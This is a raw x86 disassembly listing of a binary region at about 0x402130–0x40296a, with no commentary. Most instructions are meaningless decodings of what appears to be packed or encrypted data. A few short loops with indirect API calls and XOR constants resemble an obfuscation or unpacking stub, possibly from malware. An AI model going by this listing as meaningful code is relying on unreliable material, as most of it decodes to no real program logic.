  40212e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40212f:	or     eax,0xcff5aa3
  402134:	push   cs
  402135:	jbe    0x4020e0
  402137:	loopne 0x402130
  402139:	outs   dx,BYTE PTR ds:[esi]
  40213a:	(bad)  
  40213b:	outs   dx,DWORD PTR ds:[esi]
  40213c:	les    esi,FWORD PTR [ebx]
  40213e:	ins    BYTE PTR es:[edi],dx
  40213f:	jbe    0x402151
  402141:	pop    ecx
  402142:	cld    
  402143:	sub    al,0x17
  402145:	cmp    al,0x82
  402147:	imul   ebx,DWORD PTR [ebx-0x34f03930],0x83a368c7
  402151:	push   ecx
  402152:	imul   esp,DWORD PTR [ecx-0x1e],0xed45c9d7
  402159:	clc    
  40215a:	sbb    BYTE PTR [ecx],ah
  40215c:	jnp    0x402179
  40215e:	cwde   
  40215f:	add    al,0x24
  402161:	rcl    cl,0x26
  402164:	sti    
  402165:	dec    ebp
  402166:	push   0x4a
  402168:	push   esp
  402169:	sbb    dh,ah
  40216b:	sbb    bh,ah
  40216d:	in     al,0x81
  40216f:	and    ebx,ebx
  402171:	aam    0x3b
  402173:	(bad)  
  402174:	cs leave 
  402176:	sbb    eax,DWORD PTR [ebp+0x5f]
  402179:	call   FWORD PTR [edi]
  40217b:	jge    0x402105
  40217d:	mov    ecx,0x1499c9f6
  402182:	add    eax,0x9621efe6
  402187:	lods   eax,DWORD PTR ds:[esi]
  402188:	sbb    eax,0x789328a2
  40218d:	in     al,dx
  40218e:	call   0xf58a19ed
  402193:	stos   BYTE PTR es:[edi],al
  402194:	lahf   
  402195:	sbb    ecx,DWORD PTR [eax-0x9e9c940]
  40219b:	dec    ebx
  40219c:	adc    bh,BYTE PTR [ebp-0x42]
  40219f:	sub    eax,0xf070c645
  4021a4:	sub    eax,eax
  4021a6:	imul   ecx,DWORD PTR [eax-0x4f],0x412293a1
  4021ad:	ja     0x40221e
  4021af:	sbb    al,0x1b
  4021b1:	stc    
  4021b2:	addr16 dec esp
  4021b4:	sti    
  4021b5:	neg    BYTE PTR [edx]
  4021b7:	cdq    
  4021b8:	push   cs
  4021b9:	mov    ebx,DWORD PTR [esi-0x1b]
  4021bc:	inc    edx
  4021bd:	test   eax,0xc67a1aad
  4021c2:	push   0xffffffa6
  4021c4:	lock imul BYTE PTR [edi+0x7a]
  4021c8:	lods   al,BYTE PTR ds:[esi]
  4021c9:	jmp    0x402191
  4021cb:	sbb    edx,DWORD PTR [eax+eiz*4+0x57]
  4021cf:	adc    eax,0x8d009e7
  4021d4:	in     al,dx
  4021d5:	popf   
  4021d6:	int3   
  4021d7:	cld    
  4021d8:	xor    dl,ah
  4021da:	mov    esp,0xba0a2078
  4021df:	ss push 0x2703619d
  4021e5:	pop    esp
  4021e6:	inc    edi
  4021e7:	pop    esp
  4021e8:	js     0x402229
  4021ea:	test   al,0xab
  4021ec:	dec    esp
  4021ed:	push   edi
  4021ee:	test   al,0x46
  4021f0:	pushf  
  4021f1:	test   al,0x61
  4021f3:	mov    esp,0xdd029162
  4021f8:	pop    esi
  4021f9:	pop    ebp
  4021fa:	scas   eax,DWORD PTR es:[edi]
  4021fb:	mov    esi,0x1537fdd1
  402200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402201:	inc    edi
  402202:	(bad)  
  402204:	gs in  eax,dx
  402206:	sub    ebp,DWORD PTR [eax]
  402208:	adc    ah,BYTE PTR [ebp-0x3b7f2dbb]
  40220e:	imul   esi,DWORD PTR [ebp-0x7bc4fa83],0x92ff9967
  402218:	inc    edx
  402219:	adc    al,0x95
  40221b:	pop    ecx
  40221c:	imul   BYTE PTR ds:[ebx+0x23]
  402220:	pusha  
  402221:	pusha  
  402222:	inc    esp
  402223:	mov    WORD PTR [eax+0x273127f7],ds
  402229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40222a:	ret    
  40222b:	test   BYTE PTR [eax+0x1c],bh
  40222e:	call   DWORD PTR [esp+edi*4-0x61b9c787]
  402235:	xchg   edi,eax
  402236:	pop    es
  402237:	into   
  402238:	rcl    BYTE PTR [edi+edx*2+0x72],cl
  40223c:	sbb    eax,DWORD PTR [ebx+0x317263e0]
  402242:	inc    ebp
  402243:	or     al,0x1a
  402245:	sub    DWORD PTR [ebx+0x6c],eax
  402248:	mov    ch,0x92
  40224a:	psubb  mm7,mm3
  40224d:	aam    0x5d
  40224f:	add    BYTE PTR ds:0x35e01d0c,bh
  402255:	shl    dh,cl
  402257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402258:	rol    BYTE PTR [esi*8+0x1a62f933],0xae
  402260:	sbb    edx,DWORD PTR [edx]
  402262:	xchg   ecx,eax
  402263:	mov    ecx,0x44bd7ba5
  402268:	sub    al,0xb1
  40226a:	xor    al,0xe7
  40226c:	call   0xbd7f:0xd27aa14b
  402273:	mov    dh,0x56
  402275:	add    eax,0xbd15ba36
  40227a:	push   ss
  40227b:	pushf  
  40227c:	mov    ecx,0x9572a652
  402281:	push   0x47
  402283:	xor    al,0x19
  402285:	scas   eax,DWORD PTR es:[edi]
  402286:	psadbw mm3,QWORD PTR [edi*8-0x6dc1038f]
  40228e:	je     0x40226c
  402290:	pop    ds
  402291:	and    ebx,DWORD PTR [eax-0x6434a183]
  402297:	dec    edi
  402298:	fimul  WORD PTR [edx-0xb6d20ab]
  40229e:	fadd   st,st(0)
  4022a0:	stc    
  4022a1:	xor    DWORD PTR [esi],0xfffffff4
  4022a4:	call   FWORD PTR [ebx+0x15190f0d]
  4022aa:	(bad)  
  4022ab:	jecxz  0x4022c1
  4022ad:	pushf  
  4022ae:	jmp    0x37fd:0xf5d85042
  4022b5:	je     0x4022b8
  4022b7:	sub    eax,0x88a08051
  4022bc:	mov    DWORD PTR [edi+0x4a],ebp
  4022bf:	pop    eax
  4022c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022c1:	lods   al,BYTE PTR ds:[esi]
  4022c2:	mov    dh,0xec
  4022c4:	mov    bh,0xa5
  4022c6:	imul   ebx,DWORD PTR [edi+0x63],0x815195f1
  4022cd:	and    eax,0x42edef
  4022d2:	add    BYTE PTR [eax],al
  4022d4:	add    BYTE PTR [eax],al
  4022d6:	mov    edx,DWORD PTR ds:0x42edef
  4022dc:	inc    edx
  4022dd:	mov    DWORD PTR ds:0x42edef,edx
  4022e3:	cmp    DWORD PTR ds:0x42edef,0x28
  4022ea:	jne    0x4022fe
  4022f0:	push   DWORD PTR [ebp-0x18]
  4022f3:	push   0x56d1
  4022f8:	call   DWORD PTR ds:0x42e9bf
  4022fe:	cmp    DWORD PTR ds:0x42edef,0x19
  402305:	jb     0x4022d6
  40230b:	mov    DWORD PTR ds:0x430441,0x1f
  402315:	cmp    DWORD PTR ds:0x430441,0x0
  40231c:	je     0x402548
  402322:	cmp    DWORD PTR ds:0x430441,0x2c
  402329:	jne    0x40233a
  40232f:	push   0x7b19
  402334:	call   DWORD PTR ds:0x42e9af
  40233a:	xor    edx,edx
  40233c:	xor    edx,DWORD PTR ds:0x430441
  402342:	dec    edx
  402343:	mov    DWORD PTR ds:0x430441,edx
  402349:	jmp    0x402315
  40234e:	adc    eax,edx
  402350:	jmp    0x402548
  402355:	ds je  0x4022d9
  402358:	cdq    
  402359:	mov    cl,0x69
  40235b:	out    0x71,al
  40235d:	sub    al,0x9b
  40235f:	mov    cl,0x3a
  402361:	mov    cl,0xee
  402363:	mov    ecx,0x7e03db9e
  402368:	jle    0x4023bf
  40236a:	jg     0x4023ea
  40236c:	jle    0x402395
  40236e:	hlt    
  40236f:	dec    ebx
  402370:	bound  esi,QWORD PTR [ebp-0x6912f706]
  402376:	and    BYTE PTR ds:0x86746b81,dl
  40237c:	mov    ebp,0xa9587b31
  402381:	cwde   
  402382:	adc    DWORD PTR [ebx-0x32092d09],edi
  402388:	dec    edi
  402389:	cmp    al,0x1b
  40238c:	add    DWORD PTR [edx+0x33],0xffffffc1
  402390:	aad    0x4b
  402392:	push   esi
  402393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402394:	test   eax,0x4d351d56
  402399:	aad    0xa3
  40239b:	mov    bl,0xc7
  40239d:	inc    ecx
  40239e:	sar    DWORD PTR [edi-0x59e8f4dd],1
  4023a4:	mov    ah,0x20
  4023a6:	mov    edi,0xe25ec70b
  4023ab:	mov    al,ds:0x74f8055d
  4023b0:	(bad)  
  4023b2:	jge    0x4023dc
  4023b4:	dec    esi
  4023b5:	xchg   esi,eax
  4023b6:	sbb    ch,bh
  4023b8:	fs push ss
  4023ba:	sahf   
  4023bb:	xor    DWORD PTR [ecx-0x5c],ebp
  4023be:	inc    ebp
  4023bf:	div    DWORD PTR [ebx-0x35]
  4023c2:	xor    BYTE PTR [esi],dh
  4023c4:	cli    
  4023c5:	dec    esp
  4023c6:	cmp    DWORD PTR [edi-0x72703b4b],ecx
  4023cc:	les    edx,FWORD PTR [edi]
  4023ce:	jl     0x40235f
  4023d0:	jl     0x402386
  4023d2:	clc    
  4023d3:	add    esi,edx
  4023d5:	shl    BYTE PTR [edx+0x5b],0x2b
  4023d9:	push   esi
  4023da:	mov    dh,0x8
  4023dc:	push   esi
  4023dd:	and    BYTE PTR [ecx],ch
  4023df:	add    BYTE PTR [edx],0x4
  4023e2:	sahf   
  4023e3:	push   eax
  4023e4:	loopne 0x40241f
  4023e6:	popa   
  4023e7:	dec    ebp
  4023e8:	mov    edx,0x31abcce1
  4023ed:	push   esi
  4023ee:	sub    dl,bl
  4023f0:	retw   0xa4e
  4023f4:	adc    DWORD PTR [esp+ebx*8+0x70578c1a],ebx
  4023fb:	fld    QWORD PTR [esi]
  4023fd:	pop    ds
  4023fe:	gs jp  0x4023e8
  402401:	js     0x40238f
  402403:	cmp    dl,BYTE PTR [ecx+0x6e]
  402406:	pusha  
  402407:	fidiv  WORD PTR [ecx]
  402409:	outs   dx,BYTE PTR ds:[esi]
  40240a:	loop   0x40242a
  40240c:	push   edi
  40240d:	jl     0x40239e
  40240f:	mov    bh,0x7d
  402411:	and    BYTE PTR ds:0xec438d3b,ch
  402417:	arpl   WORD PTR [eax+0x24],di
  40241a:	sbb    edi,eax
  40241c:	jmp    0x402404
  40241e:	mov    edi,0x7452108a
  402423:	popa   
  402424:	push   ss
  402425:	retf   
  402426:	loope  0x402466
  402428:	(bad)  
  402429:	rcr    BYTE PTR [esi+0x340b98e3],1
  40242f:	sbb    DWORD PTR [ebp-0x683dd032],eax
  402435:	adc    ecx,DWORD PTR [edx]
  402437:	out    dx,al
  402438:	inc    esp
  402439:	mov    esp,DWORD PTR [ebx]
  40243b:	retf   0x5ee0
  40243e:	mov    edi,0x55b2c41d
  402443:	js     0x4023f9
  402445:	inc    ebx
  402446:	push   ss
  402447:	icebp  
  402448:	adc    al,0xc0
  40244a:	call   0xf81d:0x84be0568
  402451:	jnp    0x4024c4
  402453:	fwait
  402454:	sti    
  402455:	in     al,0xa5
  402457:	mov    bl,BYTE PTR [edi+eiz*8]
  40245a:	cmp    DWORD PTR [edx-0x71],0x24fe9bf7
  402461:	adc    al,0x58
  402463:	or     BYTE PTR [edx+edx*2-0x72],al
  402467:	xor    ch,bl
  402469:	popa   
  40246a:	dec    ebx
  40246b:	push   ss
  40246c:	mov    DWORD PTR [edx+0xc],ebx
  40246f:	push   0x104a241b
  402474:	or     eax,0xe302f8a4
  402479:	call   0x1e6938c0
  40247e:	cmp    al,0xed
  402480:	push   edx
  402481:	xlat   BYTE PTR ds:[ebx]
  402482:	push   ecx
  402483:	adc    bl,BYTE PTR [eax]
  402485:	dec    eax
  402486:	xchg   edx,eax
  402487:	push   ebp
  402488:	push   es
  402489:	add    dl,BYTE PTR [edi+ebx*4+0x7c]
  40248d:	jae    0x40245e
  40248f:	push   ss
  402490:	xor    BYTE PTR [ecx],bl
  402492:	dec    esp
  402493:	lock stos DWORD PTR es:[edi],eax
  402495:	and    DWORD PTR [eax-0x63170d08],edx
  40249b:	in     eax,dx
  40249c:	ins    BYTE PTR es:[edi],dx
  40249d:	scas   eax,DWORD PTR es:[edi]
  40249e:	imul   ebp,DWORD PTR [ebx],0x4b
  4024a1:	mul    BYTE PTR [edi+0x3c]
  4024a4:	adc    DWORD PTR [edx+ebx*4+0x603262f8],edi
  4024ab:	mov    eax,ds:0x608883ce
  4024b0:	in     al,0xc8
  4024b2:	sar    BYTE PTR [esi+0x19],1
  4024b5:	pop    ds
  4024b6:	sub    al,0x91
  4024b8:	or     al,0xc
  4024ba:	mov    ch,0x75
  4024bc:	xchg   edi,eax
  4024bd:	mov    eax,0x89431bc8
  4024c2:	or     DWORD PTR [esi+0x19],eax
  4024c5:	add    BYTE PTR [eax],al
  4024c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024c8:	mov    ds:0x8baf37eb,al
  4024cd:	xchg   BYTE PTR [ebx],al
  4024cf:	xor    DWORD PTR [ecx-0x6edf8000],esp
  4024d5:	pushf  
  4024d6:	aam    0xd5
  4024d8:	cmp    al,BYTE PTR [edi+0x735d31b]
  4024de:	push   edi
  4024df:	inc    ebp
  4024e0:	rcl    BYTE PTR [esi],cl
  4024e2:	jl     0x4024db
  4024e4:	out    0x5c,eax
  4024e6:	ins    DWORD PTR es:[edi],dx
  4024e7:	arpl   WORD PTR [ebx-0x4],ax
  4024ea:	and    al,0xaa
  4024ec:	jmp    0x4024af
  4024ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024ef:	xchg   esi,eax
  4024f0:	inc    esi
  4024f1:	fld    QWORD PTR [ebx-0x4f]
  4024f4:	jmp    0xed15772e
  4024f9:	sub    DWORD PTR [edi],ebx
  4024fb:	cli    
  4024fc:	cwde   
  4024fd:	jo     0x40251e
  4024ff:	retf   0x16ac
  402502:	and    BYTE PTR [ebp-0x322429ff],ah
  402508:	jbe    0x4024e3
  40250a:	cmp    eax,0x2b33a961
  40250f:	aad    0xf
  402511:	test   BYTE PTR [ecx],dh
  402513:	push   0xffffffac
  402515:	lea    ebp,[esi]
  402517:	sbb    eax,0x7abf10c0
  40251c:	jno    0x4024b2
  40251e:	adc    DWORD PTR [eax-0x38],0x6835ce68
  402525:	loop   0x402587
  402527:	test   ebx,0xaa2b7604
  40252d:	or     dl,BYTE PTR [ecx]
  40252f:	aaa    
  402530:	sbb    edi,DWORD PTR [edi]
  402532:	mov    bl,0x49
  402534:	mov    ah,BYTE PTR [edx]
  402536:	jo     0x4024ec
  402538:	cmp    esp,DWORD PTR [eax-0x77]
  40253b:	push   0x39
  40253d:	int3   
  40253e:	call   0x44c:0xfa221d16
  402545:	stos   BYTE PTR es:[edi],al
  402546:	push   ebx
  402547:	mov    dl,BYTE PTR [ecx-0x7f]
  40254a:	and    eax,0x42edcb
  40254f:	cmp    DWORD PTR [ebx],esi
  402551:	add    BYTE PTR [eax],al
  402553:	mov    eax,0xf89c8531
  402558:	movzx  edx,WORD PTR ds:0x42edf3
  40255f:	xor    edx,DWORD PTR ds:0x42edcf
  402565:	mov    DWORD PTR ds:0x42edf3,edx
  40256b:	mov    DWORD PTR [ebp-0x8],eax
  40256e:	xor    ecx,ecx
  402570:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  402577:	mov    edx,DWORD PTR [ebp-0x8]
  40257a:	add    DWORD PTR ds:0x430465,0x1aee
  402584:	push   esi
  402585:	mov    ecx,0x7510854
  40258a:	xor    esi,esi
  40258c:	or     esi,DWORD PTR ds:0x430445
  402592:	and    DWORD PTR ds:0x42edd7,esi
  402598:	xor    edx,ecx
  40259a:	and    DWORD PTR ds:0x4304cf,0x0
  4025a4:	jmp    0x4025b8
  4025a9:	xor    esi,esi
  4025ab:	xor    esi,DWORD PTR ds:0x4304cf
  4025b1:	inc    esi
  4025b2:	mov    DWORD PTR ds:0x4304cf,esi
  4025b8:	cmp    DWORD PTR ds:0x4304cf,0x10
  4025bf:	jae    0x4025fc
  4025c5:	cmp    DWORD PTR ds:0x4304cf,0x9
  4025cc:	jne    0x4025dd
  4025d2:	push   0x42e846
  4025d7:	call   DWORD PTR ds:0x42e9c3
  4025dd:	cmp    DWORD PTR ds:0x4304cf,0x8
  4025e4:	jne    0x4025f7
  4025ea:	mov    esi,DWORD PTR ds:0x4304cf
  4025f0:	inc    esi
  4025f1:	mov    DWORD PTR ds:0x4304cf,esi
  4025f7:	jmp    0x4025a9
  4025fc:	mov    esi,0x32729b
  402601:	jmp    0x4027f9
  402606:	lock and ch,BYTE PTR [esi+eax*1-0xf8f6f94]
  40260e:	xchg   edi,eax
  40260f:	aaa    
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	fs sub bl,bl
  402614:	jne    0x40263d
  402616:	add    DWORD PTR ds:[esi+0x7e],edi
  40261a:	push   ebp
  40261b:	jg     0x40269b
  40261d:	jle    0x4025dc
  40261f:	xor    ah,BYTE PTR ds:[ebp+0x4e4bca56]
  402626:	aam    0xe0
  402628:	fs repnz and eax,0x1431fe23
  402630:	enter  0xe493,0x61
  402634:	jp     0x4026b1
  402636:	lea    eax,[edi+0x21]
  402639:	and    BYTE PTR [ecx],bh
  40263b:	stos   BYTE PTR es:[edi],al
  40263c:	xchg   edi,eax
  40263d:	sub    BYTE PTR [ecx+0x3f212fa4],ch
  402643:	stos   DWORD PTR es:[edi],eax
  402644:	dec    edx
  402645:	push   ds
  402646:	je     0x40263d
  402648:	fsub   DWORD PTR [edx]
  40264a:	mov    edi,eax
  40264c:	lahf   
  40264d:	sbb    DWORD PTR [edx-0x70],eax
  402650:	mov    esi,0x3e6cd747
  402655:	sbb    esp,DWORD PTR [edi+0x2f]
  402658:	push   esi
  402659:	ins    BYTE PTR es:[edi],dx
  40265a:	je     0x402608
  40265c:	push   ds
  40265d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40265e:	fld    QWORD PTR [edi]
  402660:	mov    ds:0x1a531c5c,eax
  402665:	pop    esp
  402666:	int3   
  402667:	jb     0x402605
  402669:	repnz inc ebx
  40266b:	mov    eax,DWORD PTR [ecx+0x41]
  40266e:	inc    edi
  40266f:	test   DWORD PTR [ecx-0x46f1a936],esi
  402675:	xor    DWORD PTR [esi+0x12],eax
  402678:	cld    
  402679:	sub    esp,edx
  40267b:	pop    esi
  40267c:	cmp    DWORD PTR [ebp-0x4329fe1e],ebp
  402682:	push   ecx
  402683:	and    BYTE PTR [ecx-0x29],dh
  402686:	mov    edi,0x565dc036
  40268b:	rcl    bh,cl
  40268d:	xchg   si,ax
  40268f:	outs   dx,BYTE PTR ds:[esi]
  402690:	out    0xc6,al
  402692:	sub    bh,BYTE PTR [edi-0x4382d833]
  402698:	in     al,0xa9
  40269a:	mov    ?,WORD PTR [eax+0x48]
  40269d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40269e:	pop    edi
  40269f:	jae    0x402674
  4026a1:	or     eax,0x451a8ae5
  4026a6:	adc    DWORD PTR [edx+0x5c172c23],edx
  4026ac:	mov    ah,BYTE PTR [edi+0x6ee852ab]
  4026b2:	lea    edx,[ecx-0x4e203f31]
  4026b8:	add    eax,0xc63f15b5
  4026bd:	sub    BYTE PTR [eax-0x122511b7],0x4a
  4026c4:	(bad)  
  4026c5:	mov    ds:0xc0ade2e2,eax
  4026ca:	inc    esi
  4026cb:	test   BYTE PTR [esi-0x52607bf9],ah
  4026d1:	lods   eax,DWORD PTR ds:[esi]
  4026d2:	and    DWORD PTR [edi+eiz*1+0x26],edx
  4026d6:	jo     0x40269a
  4026d8:	in     eax,0x80
  4026da:	xor    BYTE PTR [esi+edi*8],bh
  4026dd:	into   
  4026de:	push   eax
  4026df:	or     BYTE PTR [ecx-0x16],0xd0
  4026e3:	cdq    
  4026e4:	inc    edx
  4026e5:	mov    eax,DWORD PTR [edx-0x5b65ec4d]
  4026eb:	int    0x13
  4026ed:	push   edi
  4026ee:	adc    ch,BYTE PTR [eax+0x5d]
  4026f1:	mov    esi,0x8aa75519
  4026f6:	pop    esp
  4026f7:	dec    ecx
  4026f8:	(bad)  
  4026f9:	jmp    0x4026ce
  4026fb:	inc    edi
  4026fc:	faddp  st(7),st
  4026fe:	and    al,cl
  402700:	jne    0x402728
  402702:	jp     0x40268c
  402704:	and    DWORD PTR [ebx-0x3eae444],ecx
  40270a:	in     al,0x50
  40270c:	push   ss
  40270d:	mov    bl,0xce
  40270f:	cmc    
  402710:	mov    ds:0x3c7f72a,al
  402715:	jecxz  0x402760
  402717:	cmp    bl,BYTE PTR [eax+0x137f8ade]
  40271d:	lods   eax,DWORD PTR ds:[esi]
  40271e:	in     al,0x6d
  402720:	inc    esp
  402721:	push   eax
  402722:	loope  0x402781
  402724:	fisttp DWORD PTR [edx+0x2b]
  402727:	sbb    eax,0x5746b581
  40272c:	ja     0x40272d
  40272e:	in     eax,dx
  40272f:	shr    edx,0x8f
  402732:	dec    ecx
  402733:	fdiv   DWORD PTR [esi]
  402735:	mov    eax,ds:0xc694a7b0
  40273a:	loopne 0x4026e5
  40273c:	pop    ebx
  40273d:	icebp  
  40273e:	mov    bl,0xae
  402740:	repnz ins BYTE PTR es:[edi],dx
  402742:	mov    edi,0x604ca3d4
  402747:	jbe    0x4026d1
  402749:	fwait
  40274a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40274b:	jecxz  0x402737
  40274d:	idiv   BYTE PTR [edx]
  40274f:	bound  edx,QWORD PTR [edi+0x34762772]
  402755:	aaa    
  402756:	cdq    
  402757:	addr16 add eax,0xad296596
  40275d:	in     eax,dx
  40275e:	push   edx
  40275f:	lahf   
  402760:	ja     0x402740
  402762:	and    bl,BYTE PTR [ecx]
  402764:	scas   eax,DWORD PTR es:[edi]
  402765:	add    ch,al
  402767:	js     0x40273d
  402769:	pop    ebp
  40276a:	cmp    ecx,DWORD PTR [ecx+eax*1]
  40276d:	dec    esi
  40276e:	es pop ebp
  402770:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402772:	mov    ?,WORD PTR [ecx-0xb]
  402775:	(bad)  
  402776:	dec    ebp
  402777:	jge    0x4027df
  402779:	dec    esp
  40277a:	test   DWORD PTR [esp+ebx*8-0x5b],eax
  40277e:	(bad)  
  40277f:	mov    dh,0x64
  402781:	xor    al,0xa4
  402783:	leave  
  402784:	lock xchg esp,eax
  402786:	xor    bl,BYTE PTR [esi+0x3d]
  402789:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40278b:	cld    
  40278c:	mov    DWORD PTR [edx],eax
  40278e:	xchg   ebx,eax
  40278f:	int3   
  402790:	pop    ecx
  402791:	sbb    DWORD PTR [edx-0x77bc8531],edx
  402797:	mov    eax,0xd5d11029
  40279c:	(bad)  
  40279d:	hlt    
  40279e:	jno    0x4027f4
  4027a0:	rol    BYTE PTR [edx],1
  4027a2:	mov    ecx,0x29667c07
  4027a7:	mov    edx,0xbf61b93c
  4027ac:	push   0x86d5c840
  4027b1:	and    al,0x38
  4027b3:	sub    DWORD PTR [edi+0xf],ebp
  4027b6:	clc    
  4027b7:	jp     0x402803
  4027b9:	push   ecx
  4027ba:	ret    0x2555
  4027bd:	inc    esi
  4027be:	inc    edi
  4027bf:	mov    esi,0x2700d72c
  4027c4:	(bad)  
  4027c5:	jmp    0x402792
  4027c7:	sub    BYTE PTR ds:0x10430d8c,0xcb
  4027ce:	xor    ebx,DWORD PTR [edi+0x68]
  4027d1:	jp     0x402788
  4027d3:	pop    edx
  4027d4:	(bad)  
  4027d5:	mov    WORD PTR [edi+0x6e],fs
  4027d8:	and    ebx,DWORD PTR [ebx+0x53]
  4027db:	adc    ecx,esp
  4027dd:	fisttp WORD PTR [ebx+edx*2]
  4027e0:	imul   edi,DWORD PTR [ecx-0x49c4096a],0xfffffff5
  4027e7:	dec    ebp
  4027e8:	out    0xb5,al
  4027ea:	xor    ch,ah
  4027ec:	ja     0x4027a1
  4027ee:	(bad)  
  4027ef:	cmc    
  4027f0:	fcomip st,st(7)
  4027f2:	adc    eax,0x4f97610c
  4027f7:	mov    ch,0xaa
  4027f9:	push   edi
  4027fa:	mov    edi,DWORD PTR [ebp+0x10]
  4027fd:	add    edx,esi
  4027ff:	cmp    edi,edx
  402801:	je     0x402e62
  402807:	mov    edx,DWORD PTR [ebp-0x8]
  40280a:	mov    eax,DWORD PTR [ebp-0x4]
  40280d:	xor    eax,ecx
  40280f:	mov    edi,0xffcd8d65
  402814:	sub    edi,eax
  402816:	jmp    0x402a0e
  40281b:	ins    BYTE PTR es:[edi],dx
  40281c:	cmp    al,0x55
  40281e:	arpl   WORD PTR [ebp+0x73],si
  402821:	push   0x2ad4f5d1
  402826:	xor    ebx,eax
  402828:	(bad)  
  402829:	pop    edx
  40282a:	mov    WORD PTR ds:0x557e7e0f,ss
  402830:	jg     0x4028b0
  402832:	jle    0x40284e
  402834:	aam    0x41
  402836:	sti    
  402837:	div    bl
  402839:	jno    0x402827
  40283b:	scas   eax,DWORD PTR es:[edi]
  40283c:	repnz xor al,0xca
  40283f:	lock xchg ebx,eax
  402841:	or     ecx,DWORD PTR [eax]
  402843:	sbb    dh,BYTE PTR [eax]
  402845:	icebp  
  402846:	stos   DWORD PTR es:[edi],eax
  402847:	cmp    eax,0x3cc8f060
  40284c:	xor    edx,DWORD PTR [edx-0x516da050]
  402852:	or     DWORD PTR [eax],edi
  402854:	out    0x18,eax
  402856:	ins    DWORD PTR es:[edi],dx
  402857:	sub    BYTE PTR [eax],ch
  402859:	and    dh,BYTE PTR [edx-0x4d]
  40285c:	call   0xcbb7b3fe
  402861:	xlat   BYTE PTR ds:[ebx]
  402862:	loope  0x4028da
  402864:	add    ecx,DWORD PTR [ebx+0x10e3c60e]
  40286a:	or     bl,BYTE PTR cs:[ecx+0x20]
  40286e:	idiv   BYTE PTR [eax]
  402870:	and    ah,cl
  402872:	mov    al,ds:0xef38be4f
  402877:	xor    eax,0x7ac86ea3
  40287c:	test   DWORD PTR [ebp-0x6133a12e],ebx
  402882:	dec    esi
  402883:	std    
  402884:	loopne 0x402827
  402886:	adc    BYTE PTR [ebp+0x4f],bl
  402889:	nop
  40288a:	xchg   esi,eax
  40288b:	stc    
  40288c:	(bad)  
  40288d:	pop    esp
  40288e:	outs   dx,BYTE PTR ds:[esi]
  40288f:	dec    edi
  402890:	mov    BYTE PTR [edi],0xfb
  402893:	nop
  402894:	jecxz  0x402895
  402896:	pop    ss
  402897:	fst    QWORD PTR [esi]
  402899:	imul   ebx,DWORD PTR [eax-0x1],0x84857750
  4028a0:	rcl    BYTE PTR [esi+0x52],1
  4028a3:	sub    esi,DWORD PTR [edx]
  4028a5:	jl     0x40289e
  4028a7:	mov    ds,WORD PTR [esi+0x211b6e47]
  4028ad:	sbb    al,0xb
  4028af:	mov    ch,0x35
  4028b1:	push   0xfffffff0
  4028b3:	pop    DWORD PTR [ebx+edi*4+0x4c89e951]
  4028ba:	dec    edx
  4028bb:	pop    ecx
  4028bc:	add    esi,ebp
  4028be:	sar    BYTE PTR [esi],cl
  4028c0:	mov    dh,bh
  4028c2:	div    BYTE PTR [edx-0x31b65f6e]
  4028c8:	fcom   QWORD PTR fs:[ebx-0x65]
  4028cc:	adc    DWORD PTR [edx],esi
  4028ce:	xor    ebp,esi
  4028d0:	in     al,dx
  4028d1:	aam    0x95
  4028d3:	xchg   esi,eax
  4028d4:	or     DWORD PTR [esi+0x34],ebx
  4028d7:	sbb    dl,dh
  4028d9:	inc    edi
  4028da:	outs   dx,BYTE PTR ds:[esi]
  4028db:	aam    0x12
  4028dd:	lods   eax,DWORD PTR ds:[esi]
  4028de:	and    DWORD PTR [esi+0x67],edi
  4028e1:	js     0x402902
  4028e3:	in     eax,0xa7
  4028e5:	or     BYTE PTR [edx+ecx*8+0x4cc0f731],ah
  4028ec:	jge    0x402870
  4028ee:	pop    ebx
  4028ef:	iret   
  4028f0:	xlat   BYTE PTR ds:[ebx]
  4028f1:	in     eax,0xd5
  4028f3:	aaa    
  4028f4:	xor    al,0xc6
  4028f6:	popf   
  4028f7:	push   esp
  4028f8:	jbe    0x402910
  4028fa:	pop    ebx
  4028fb:	xor    ebp,DWORD PTR [edx+0x72]
  4028fe:	lds    edi,FWORD PTR [edx+0x46aa606a]
  402904:	cmc    
  402905:	mov    WORD PTR [ebp+0x6331300d],cs
  40290b:	jg     0x40294d
  40290d:	repz test BYTE PTR [edx+0xfffe8cc],0x1
  402915:	das    
  402916:	mov    ebp,0x52a45fd3
  40291b:	inc    eax
  40291c:	and    eax,0xac6047e2
  402921:	jb     0x402947
  402923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402924:	in     al,0x96
  402926:	aam    0xa4
  402928:	(bad)  
  402929:	addr16 adc edx,ebp
  40292c:	daa    
  40292d:	imul   ebp,DWORD PTR [ecx+0x29],0x79571778
  402934:	std    
  402935:	scas   eax,DWORD PTR es:[edi]
  402936:	xchg   edx,edi
  402938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402939:	pop    ebp
  40293a:	or     al,0x20
  40293c:	and    ecx,DWORD PTR [ebp-0x7b07a0f3]
  402942:	ja     0x402918
  402944:	lea    esp,[ebp+0x3734241d]
  40294a:	jle    0x4028e3
  40294c:	loop   0x402961
  40294e:	sahf   
  40294f:	(bad)  
  402951:	jnp    0x402923
  402953:	xchg   edi,eax
  402954:	adc    eax,0xa9db463d
  402959:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40295a:	js     0x402902
  40295c:	div    DWORD PTR [ebp-0x7f]
  40295f:	loop   0x4029dd
  402961:	push   ecx
  402962:	push   0x22
  402964:	and    BYTE PTR [ecx-0x3e7568e8],al
  40296a:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
